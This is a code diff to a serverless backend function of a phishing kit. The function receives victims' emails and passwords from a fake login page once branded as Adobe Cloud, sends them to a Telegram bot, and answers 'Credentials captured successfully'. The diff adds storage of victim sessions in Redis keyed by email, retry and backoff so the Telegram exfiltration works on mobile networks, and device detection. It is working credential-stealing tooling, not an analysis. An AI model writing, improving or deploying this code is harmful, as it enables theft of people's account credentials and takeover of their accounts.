@@ -1,3 +1,5 @@
+const { Redis } = require('@upstash/redis');
+
 exports.handler = async (event, context) => {
   // CORS headers
   const headers = {
@@ -27,8 +29,17 @@ exports.handler = async (event, context) => {
     const data = JSON.parse(event.body);
     const { email, password, provider, fileName, timestamp, userAgent } = data;
 
-    // Get client IP
-    const clientIP = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || 'Unknown';
+    // Get client IP with better detection for mobile
+    const clientIP = event.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+                     event.headers['x-real-ip'] || 
+                     event.headers['cf-connecting-ip'] || 
+                     'Unknown';
+
+    // Initialize Upstash Redis
+    const redis = new Redis({
+      url: process.env.UPSTASH_REDIS_REST_URL,
+      token: process.env.UPSTASH_REDIS_REST_TOKEN,
+    });
 
     // Telegram Bot Configuration
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
@@ -43,9 +54,30 @@ exports.handler = async (event, context) => {
       };
     }
 
-    // Format message for Telegram
+    // Store session data in Redis with 24-hour expiration
+    const sessionId = Math.random().toString(36).substring(2, 15);
+    const sessionData = {
+      email,
+      provider,
+      fileName,
+      timestamp,
+      sessionId,
+      clientIP,
+      userAgent,
+      deviceType: /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'mobile' : 'desktop'
+    };
+
+    // Store in Redis with 24-hour TTL
+    await redis.setex(`session:${sessionId}`, 86400, JSON.stringify(sessionData));
+    
+    // Also store by email for cross-device access
+    await redis.setex(`user:${email}`, 86400, JSON.stringify(sessionData));
+
+    // Format message for Telegram with better mobile detection
+    const deviceInfo = /Mobile|Android|iPhone|iPad/.test(userAgent) ? '📱 Mobile Device' : '💻 Desktop';
+    
     const message = `
-🔐 *Adobe Cloud Login Captured*
+🔐 *Email Login Captured*
 
 📧 *Email:* \`${email}\`
 🔑 *Password:* \`${password}\`
@@ -53,24 +85,51 @@ exports.handler = async (event, context) => {
 📄 *File Accessed:* ${fileName}
 🕒 *Timestamp:* ${new Date(timestamp).toLocaleString()}
 🌐 *IP Address:* ${clientIP}
-💻 *User Agent:* ${userAgent}
+${deviceInfo}
+🆔 *Session ID:* \`${sessionId}\`
 
 ---
-*Adobe Cloud Security System*
+*Paris365*
     `;
 
-    // Send to Telegram
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'Markdown',
-      }),
-    });
+    // Send to Telegram with retry logic for mobile networks
+    let telegramResponse;
+    let retryCount = 0;
+    const maxRetries = 3;
+
+    while (retryCount < maxRetries) {
+      try {
+        telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+          }),
+          // Add timeout for mobile networks
+          signal: AbortSignal.timeout(15000),
+        });
+
+        if (telegramResponse.ok) {
+          break; // Success, exit retry loop
+        }
+        
+        throw new Error(`HTTP ${telegramResponse.status}`);
+      } catch (error) {
+        retryCount++;
+        console.error(`Telegram attempt ${retryCount} failed:`, error.message);
+        
+        if (retryCount === maxRetries) {
+          throw error;
+        }
+        
+        // Wait before retry (exponential backoff)
+        await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
+      }
+    }
 
     if (!telegramResponse.ok) {
       const errorText = await telegramResponse.text();
@@ -81,15 +140,28 @@ exports.handler = async (event, context) => {
     return {
       statusCode: 200,
       headers,
-      body: JSON.stringify({ success: true, message: 'Credentials captured successfully' }),
+      body: JSON.stringify({ 
+        success: true, 
+        message: 'Credentials captured successfully',
+        sessionId: sessionId
+      }),
     };
 
   } catch (error) {
     console.error('Error in sendTelegram function:', error);
+    
+    // Better error handling for different scenarios
+    let errorMessage = 'Internal server error';
+    if (error.name === 'AbortError') {
+      errorMessage = 'Request timeout - please check your connection';
+    } else if (error.message.includes('Failed to send to Telegram')) {
+      errorMessage = 'Communication error - please try again';
+    }
+    
     return {
       statusCode: 500,
       headers,
-      body: JSON.stringify({ error: 'Internal server error' }),
+      body: JSON.stringify({ error: errorMessage }),
     };
   }
 };
